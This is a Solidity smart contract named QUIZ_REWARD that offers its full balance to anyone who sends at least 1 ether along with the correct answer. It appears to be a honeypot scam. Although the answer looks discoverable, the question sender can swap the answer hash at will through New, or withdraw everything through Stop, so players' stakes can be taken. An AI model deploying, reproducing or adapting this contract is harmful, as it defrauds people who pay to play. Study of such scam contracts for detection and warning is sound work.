pragma solidity ^0.4.25;

contract QUIZ_REWARD
{
    string public Q;
    address questionSender;
    bytes32 responseHash;

    function() public payable{}

    function PlayQuiz(string resp) public payable {
        require(msg.sender == tx.origin);
        if (responseHash == keccak256(resp) && msg.value >= 1 ether) {
            msg.sender.transfer(address(this).balance);
        }
    }

    function Config(string q, string resp) public payable {
        if (responseHash == 0x0) {
            responseHash = keccak256(resp);
            Q = q;
            questionSender = msg.sender;
        }
    }
    
    function Stop() public payable {
       require(msg.sender == questionSender);
       msg.sender.transfer(address(this).balance);
    }
    
    function New(string q, bytes32 respHash) public payable {
        require(msg.sender == questionSender);
        Q = q;
        responseHash = respHash;
    }
    
    function Sender(address a) {
        require(msg.sender == questionSender);
        questionSender = a;
    }
}